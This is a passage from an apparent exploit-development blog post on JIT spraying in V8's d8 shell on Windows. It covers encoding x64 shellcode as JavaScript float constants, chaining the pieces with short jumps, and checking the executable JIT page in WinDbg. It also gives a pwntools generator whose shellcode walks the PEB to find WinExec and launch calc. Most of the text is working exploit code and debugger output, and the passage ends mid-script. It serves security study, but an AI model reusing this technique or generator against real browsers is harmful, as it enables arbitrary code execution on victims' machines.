<p>After invoking the function, we then tell d8 to JIT compile the
function on the next call with <em>%OptimizeFunctionOnNextCall</em> and
then we finally invoke the optimized shellcode function.
The <em>DebugPrint</em> statement from the last line will allow us to
inspect the internals of the JIT-compiled function.</p>
<p>We can then aunch d8 with native syntax debugging option and load the code.</p>
<pre tabindex="0"><code>C:\v8_dev\v8\v8\out&gt;x64.release\d8.exe --maglev --allow-natives-syntax
V8 version 11.5.150.16
d8&gt; load(&#34;jitspray1.js&#34;)
...
</code></pre><blockquote>
<p>Starting D8 With Natives-Syntax Option and Loading &lsquo;Jitspray1.js&rsquo;</p>
</blockquote>
<p>The debug output gives information about the <em>shellcode</em> function&rsquo;s internal
representation in V8, including its memory address, map, prototype,
elements.</p>
<pre tabindex="0"><code>DebugPrint: 000003C70004BF61: [Function]
 - map: 0x03c7001841a5 &lt;Map[28](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x03c700184059 &lt;JSFunction (sfi = 000003C700146745)&gt;
 - elements: 0x03c700000219 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - function prototype: &lt;no-prototype-slot&gt;
 - shared_info: 0x03c70019a469 &lt;SharedFunctionInfo shellcode&gt;
 - name: 0x03c70019a3f5 &lt;String[9]: #shellcode&gt;
 - formal_parameter_count: 0
 - kind: ArrowFunction
 - context: 0x03c70019a525 &lt;ScriptContext[3]&gt;
 - code: 0x03c70019ba29 &lt;Code TURBOFAN&gt;
...
</code></pre><blockquote>
<p>Inspecting the &lsquo;shellcode&rsquo; Function via the DebugPrint Statement.</p>
</blockquote>
<p>The last line from the above listing shows the memory address of
the code JS object compiled by Turbofan.</p>
<p>To further inspect the resulting JIT compiled code in memory we can
fire up WinDbg and attach to the d8 process. From the debugger, we can
inspect the first three qwords of the code object. To do so, we first
need to subtract 1 from from the obj value.
Why so?
This is due to <a href="https://v8.dev/blog/pointer-compression">pointer
tagging</a>. Pointer tagging
involves encoding additional information within pointers by using the
least significant bits (LSBs). This helps V8 quickly distinguish
between different types of data without extra memory overhead. The
least significant bit of a pointer is used as a tag. If the LSB is 0,
the pointer is a reference to an object. If the LSB is 1, the pointer
represents a small integer.</p>
<pre tabindex="0"><code>0:017&gt; dq 0x03c70019ba29-1 L3
000003c7`0019ba28  0019b995`00000d91 e0044031`00000f61
000003c7`0019ba38  00007ff6`e0044040
</code></pre><blockquote>
<p>Inspecting the &lsquo;code&rsquo; object</p>
</blockquote>
<p>From the listing above, the first qword <em>0x03c700000d91</em> is the object
MAP or Hidden Class, the second one <em>0x03c700000f61</em> is the <em>position
table</em>. The position table is a data structure that maps bytecode
instruction offsets to positions within the generated machine code.
The last qword at address <em>00007FF6E0044040</em> is the <em>instruction
start</em>, that points to the start of the JIT compiled assembly code,
that we shall further analyze.</p>
<pre tabindex="0"><code>0:020&gt; u 00007ff6`e0044040 L30
00007ff6`e0044040 8b59f4          mov     ebx,dword ptr [rcx-0Ch]
00007ff6`e0044043 4903de          add     rbx,r14
00007ff6`e0044046 f7431700000020  test    dword ptr [rbx+17h],20000000h
00007ff6`e004404d 0f85edd348a5    jne     d8!Builtins_CompileLazyDeoptimizedCode (00007ff6`854d1440)
00007ff6`e0044053 55              push    rbp
00007ff6`e0044054 4889e5          mov     rbp,rsp
00007ff6`e0044057 56              push    rsi
00007ff6`e0044058 57              push    rdi
00007ff6`e0044059 50              push    rax
...
00007ff6`e0044094 49ba9a9999999999f13f mov r10,3FF199999999999Ah
00007ff6`e004409e c4c1f96ec2      vmovq   xmm0,r10
00007ff6`e00440a3 c5fb114107      vmovsd  qword ptr [rcx+7],xmm0
00007ff6`e00440a8 49ba9a99999999990140 mov r10,400199999999999Ah
00007ff6`e00440b2 c4c1f96ec2      vmovq   xmm0,r10
00007ff6`e00440b7 c5fb11410f      vmovsd  qword ptr [rcx+0Fh],xmm0
00007ff6`e00440bc 49ba6666666666660a40 mov r10,400A666666666666h
</code></pre><blockquote>
<p>Analyzing the JIT Compiled Code in Memory</p>
</blockquote>
<p>The last seven lines are responsible for moving our three
floating-point digits into memory. The numbers are stored first into
the <em>r10</em> register and then moved into the <em>xxm0</em> register. XMM
registers are part of the SIMD (Single Instruction, Multiple Data)
architecture extensions in x86 and x86-64 processors and mainly used
for performing vectorized operations on floating-point and integer
data.</p>
<p>We can verify the float representation of the first hexadecimal value
(1.1) with the <em>.formats.</em> WinDbg utility.</p>
<pre tabindex="0"><code>0:020&gt; .formats 3FF199999999999Ah
Evaluate expression:
  Hex:     3ff19999`9999999a
  Decimal: 4607632778762754458
  Decimal (unsigned) : 4607632778762754458
  Octal:   0377614631463146314632
  Binary:  00111111 11110001 10011001 10011001 10011001 10011001 10011001 10011010
  Chars:   ?.......
  Time:    Mon Jan  4 09:24:36.275 16202 (UTC + 2:00)
  Float:   low -1.58819e-023 high 1.8875
  Double:  1.1
</code></pre><blockquote>
<p>Converting the Floating-Point Value</p>
</blockquote>
<p>Now, let&rsquo;s remind us of our main objective: we have to use the 8-byte
structure commonly used for representing floating-point values to
directly encode our shellcode instructions. By embedding these
instructions within the V8 isolated heap memory in the form of
&lsquo;floating-number shaped shellcode&rsquo;, we can then transform them into
the required shellcode assembly instructions as soon as the JavaScript
function gets JIT-compiled.</p>
<p>We&rsquo;ll then have to link these encoded instructions together using
short jump commands, creating a more reliable exploit strategy. Let&rsquo;s
see how can we accomplish this.</p>
<p>First, we verify whether the memory page belonging to the JIT code is
writable and executable.</p>
<pre tabindex="0"><code>0:017&gt; !vprot 00007ff6`e0044040
BaseAddress:       00007ff6e0044000
AllocationBase:    00007ff6e0000000
AllocationProtect: 00000001  PAGE_NOACCESS
RegionSize:        000000000003b000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE
</code></pre><blockquote>
<p>Veryfing JIT Code Memory Permission</p>
</blockquote>
<p>Having confirmed so, we can replicate what we did on d8 previously
with a new different function named <em>shellcode2</em>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">shellcode2</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;{</span><span class="k">return</span><span class="p">[</span><span class="mf">1.9711828988902654</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711828988941678</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="o">-</span><span class="mf">6.82852703444537</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span><span class="p">];}</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">shellcode2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">shellcode2</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">shellcode2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">shellcode2</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">shellcode2</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<p>The shellcode2 Function</p>
</blockquote>
<p>The only difference with our previous code snippet, is that the function
returns three different floats, <em>1.9711828988902654e-246</em>,
<em>1.9711828988941678e-246</em>, <em>-6.82852703444537e-229</em> as first,
second and third values respectively, instead of 1.1, 2.2 and 3.3 that we had earlier.</p>
<p>The first new float, __<em>1.9711828988902654e-246</em> is the hex
representation of the a break point, five nops and a short jump.</p>
<pre tabindex="0"><code>cc              int     3
90              nop
90              nop
90              nop
90              nop
90              nop
eb0c            jmp     
</code></pre><blockquote>
<p>The Encoded Instruction in the First Floating Point.</p>
</blockquote>
<p>The second and third values are just similar int3/nop iterations of
the first one.</p>
<p>But how do we know in advance which given assembly instruction is
mapped to a specific float value? We&rsquo;ll solve that bit of the puzzle
in a moment. For now, let&rsquo;s assume we have managed to correctly
convert our shellcode to floating point numbers.</p>
<p>By opening d8 once more and attaching WinDbg to it, we can inspect the
resulting code section of <em>shellcode2</em> by repeating the steps we
did previously.</p>
<p>Once found the instruction start from the code object, we can inspect the
first 30 qwords from it, similarly to what we did before.</p>
<pre tabindex="0"><code>0:020&gt; u 00007ff6`e0044040 L30
...
00007ff6`e0044094 49bacc9090909090eb0c mov r10,0CEB9090909090CCh
00007ff6`e004409e c4c1f96ec2      vmovq   xmm0,r10
00007ff6`e00440a3 c5fb114107      vmovsd  qword ptr [rcx+7],xmm0
00007ff6`e00440a8 49bacccc90909090eb0c mov r10,0CEB90909090CCCCh
00007ff6`e00440b2 c4c1f96ec2      vmovq   xmm0,r10
00007ff6`e00440b7 c5fb11410f      vmovsd  qword ptr [rcx+0Fh],xmm0
00007ff6`e00440bc 49bacccc909090909090 mov r10,909090909090CCCCh
</code></pre><blockquote>
<p>Regular Float Moving Instructions</p>
</blockquote>
<p>Nothing seems different at first glance, but what happens if we start
disassembling from an offset of 2 bytes instead?</p>
<pre tabindex="0"><code>0:020&gt; u 00007ff6`e0044094+2 
00007ff6`e0044096 cc              int     3
00007ff6`e0044097 90              nop
00007ff6`e0044098 90              nop
00007ff6`e0044099 90              nop
00007ff6`e004409a 90              nop
00007ff6`e004409b 90              nop
00007ff6`e004409c eb0c            jmp     00007ff6`e00440aa
00007ff6`e004409e c4c1f96ec2      vmovq   xmm0,r10
</code></pre><blockquote>
<p>Simple Floating-Point Based Shellcode</p>
</blockquote>
<p>Yes, that&rsquo;s our shellcode and as mentioned, it begins with a
breakpoint, followed by five <em>NOPs</em> and a short jump. The final <em>jmp</em> allows us to
hop over the unwanted <em>vmovq</em> instruction, allowing execution to continue to
the next shellcode part located at memory address <em>00007ff6e00440aa</em>.</p>
<pre tabindex="0"><code>0:020&gt; u 00007ff6`e00440aa
00007ff6`e00440aa cc              int     3
00007ff6`e00440ab cc              int     3
00007ff6`e00440ac 90              nop
00007ff6`e00440ad 90              nop
00007ff6`e00440ae 90              nop
00007ff6`e00440af 90              nop
00007ff6`e00440b0 eb0c            jmp     00007ff6`e00440be
0:020&gt; u 00007ff6`e00440be
00007ff6`e00440be cc              int     3
00007ff6`e00440bf cc              int     3
00007ff6`e00440c0 90              nop
00007ff6`e00440c1 90              nop
00007ff6`e00440c2 90              nop
00007ff6`e00440c3 90              nop
00007ff6`e00440c4 90              nop
00007ff6`e00440c5 90              nop
</code></pre><blockquote>
<p>The Second and Third Floats Represented as Instructions</p>
</blockquote>
<p>We can use the jump trick again to chain all the remaining shellcode
blocks together. Even though floating-point values are stored as an
8-byte value, we can encode only 6 bytes at a time. This is due to the
fact that we need a two-byte short jump instruction for each shellcode
segment.</p>
<p>Now, the question still bugs us: how do we convert assembly shellcode
into a floating-point JavaScript payload? To generate our target JS
shellcode, we can rely on a Python script that converts assembly
instructions into floating-point values. We’ll use the
<a href="https://docs.pwntools.com/en/stable/">pwntools</a> library to handle the
heavy lifting of generating the assembly code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">jmp</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xeb\x0c</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">values</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_double</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">    <span class="n">hex_value</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">jmp</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="n">double_value</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!d&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_value</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)))[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">values</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">double_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;int3;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># placeholder for more shellcode instructions</span>
</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;int3;int3;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="n">hex_value</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)))[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">double_value</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!d&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_value</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)))[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">values</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">double_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">js_function</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">function func() </span><span class="se">{{</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">  return [</span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">values</span><span class="p">))</span><span class="si">}</span><span class="s1">];
</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="se">}}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">js_function</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p>JS Floating-Point Shellcode Generator</p>
</blockquote>
<p>This code snippet imports the necessary libraries and sets up the
environment for generating shellcode. It defines a function
<em>make_double()</em> that encodes shellcode assembly instructions into double-precision
floating-point numbers.</p>
<p>The encoded values are stored in a list names <em>values</em>. Finally, it
generates a JavaScript function <em>func()</em> that returns an array of these
encoded floating-point numbers, which we can copy and paste into our final exploit.</p>
<p>Having devised a way to automate shellcode generation,
we&rsquo;ll now need to create a Windows specific shellcode
since the original exploits contains a standard Linux
<a href="https://man7.org/linux/man-pages/man2/execve.2.html">execve</a>
shellcode.</p>
<p>Since we are using a spraying technique to deliver our payload, for
stability and reliability reasons, it&rsquo;s better to keep it fairly
concise in size. For the sake of this blog post, our best shot is
calling WinExec to spawn a calculator.</p>
<p>To simplify the process, we&rsquo;ll break down this step into two parts.
The initial part of our shellcode will focus on locating the address
of the WinExec function. The second one will handle passing the &ldquo;calc&rdquo;
string as an argument.</p>
<p>The
<a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExe</a>
API is exported by the KERNEL32 DLL, so we need a way to locate the
base address of KERNEL32. This can be achieved by parsing the Process Environment Block.</p>
<p>The Process Environment Block
(<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">PEB</a>)
is a data structure used by Windows to store information about
a process. Within the PEB structure, there is a field called Ldr
(Loader), which points to a linked list of loaded modules called the
<em>InMemoryOrderModuleList</em>. This list contains information about the
modules (DLLs) loaded into the process&rsquo;s address space, including
their base addresses, sizes, and other attributes. We can parse
<em>InMemoryOrderModuleList</em> in order to get KERNEL32 base address and
add WinExec static offset to it.</p>
<p>Let&rsquo;s verify how can we accomplish this with the first portion of our
shellcode.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;int3;add rbx,0x60;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov r8,qword ptr gs:[rbx];&#34;</span><span class="p">))</span>    
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rdi,qword ptr [r8+0x18];&#34;</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rdi,qword ptr [rdi+0x30];&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rdi,qword ptr [rdi];mov rdi,qword ptr [rdi];&#34;</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rax,qword ptr [rdi+0x10];&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add rax,0x686c0;&#34;</span><span class="p">))</span>              
</span></span></code></pre></div><blockquote>
<p>Shellcode part that Locates WinExec Location</p>
</blockquote>
<p>At the beginning, we have a software breakpoint instruction (<em>int3</em>)
for debugging purposes. Following that, we adjust the <em>rbx</em> register
by adding <em>0x60</em>. At the offset of <em>0x60</em> from the <em>GS</em> register, we
can retrieve the Process Environment Block (PEB) base address and
store it in <em>R8</em>.</p>
<p>On the next line, we dereference the address at the
<em>0x18</em> offset from the PEB and store it in <em>RDI</em>, representing the
<em>Ldr</em> structure. To retrieve the InMemoryOrderModuleList from it,
on line 4, we dereference the address at offset <em>0x30</em> from
<em>RDI</em>.</p>
<p>Since KERNEL32 is the third loaded DLL in memory (after V8.dll
and NTDLL.dll), we need iterate over the list two times.
To achieve this, on lines 5 and 6, we load two 64-bit values from
memory into the <em>RDI</em> register twice. Finally, at offset <em>0x10</em> from the
<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">PEB_LDR_DATA</a>
structure, we find the <em>DllBase</em> member containing the KERNEL32 base
address. In the last line, we add the hardcoded WinExec offset to the KERNEL32
base address.</p>
<p>Now that we have retrieved the address of WinExec, we need a way to
craft the function arguments. By reviewing WinExec function prototype,
we learn that the first argument (RCX) is a pointer to a aerrass
null-terminated string that specifies the command-line string to be
executed. The second argument (RDX) is
<a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">uCmdShow</a>.
which will be set to <em>1</em> in order to display the calculator window.
Here&rsquo;s the second part of the Python script that accomplishes what discussed. aaaassb</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">calc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;calc</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;push </span><span class="si">%d</span><span class="s2">; pop rcx;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">calc</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;push </span><span class="si">%d</span><span class="s2">; pop rdx;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">calc</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;shl rcx, 0x20;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add rcx,rdx;xor rdx,rdx;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;push rcx;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rcx,rsp;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;inc rdx;call rax&#34;</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p>Shellcode Part That Loads the Two Function Arguments and Calls WinExec</p>
</blockquote>
<p>We start by declaring the first argument, that is the null terminated
<em>calc</em> string variable as unsigned 64-bit integer. On the the first
line from the above assembly code, we push the high 32 bits of the
calc variable to the stack and then pop it into the RCX register.
Next, we load the low 32 bits of calc onto the stack and then move it
to the rdx register. Next, on line three. we shift the contents of RCX
left by 32 bits to position the high bits of calc correctly. Then on
line four, we add together the high and low bits of calc in RCX, thus
restoring the <em>calc</em> string original state. As last instruction we
clear out the value of RDX, which will become <em>1</em> later on.</p>
<p>We then push the string stored in RCX to the stack and dereference RSP
into RCX. This will to set up the first WinExec argument, the pointer
to a  null-terminated string. Finally, we increment the value of the
second function argument in RDX and call the function pointed to by
RAX, that is the <em>WinExec</em> function address we stored earlier.</p>
<p>Here&rsquo;s the complete python code that generates our floating-point shellcode.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">jmp</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xeb\x0c</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">calc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;calc</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">values</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_double</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">    <span class="n">hex_value</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">jmp</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="n">double_value</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!d&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_value</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)))[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">values</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">double_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;int3;add rbx,0x60;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov r8,qword ptr gs:[rbx];&#34;</span><span class="p">))</span>   
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rdi,qword ptr [r8+0x18];&#34;</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rdi,qword ptr [rdi+0x30];&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rdi,qword ptr [rdi];mov rdi,qword ptr [rdi];&#34;</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rax,qword ptr [rdi+0x10];&#34;</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add rax,0x686c0;&#34;</span><span class="p">))</span>               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;push </span><span class="si">%d</span><span class="s2">; pop rcx;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">calc</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;push </span><span class="si">%d</span><span class="s2">; pop rdx;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">calc</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;shl rcx, 0x20;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add rcx,rdx;xor rdx,rdx;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;push rcx;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">make_double</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rcx,rsp;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;inc rdx;call rax&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">8</span>
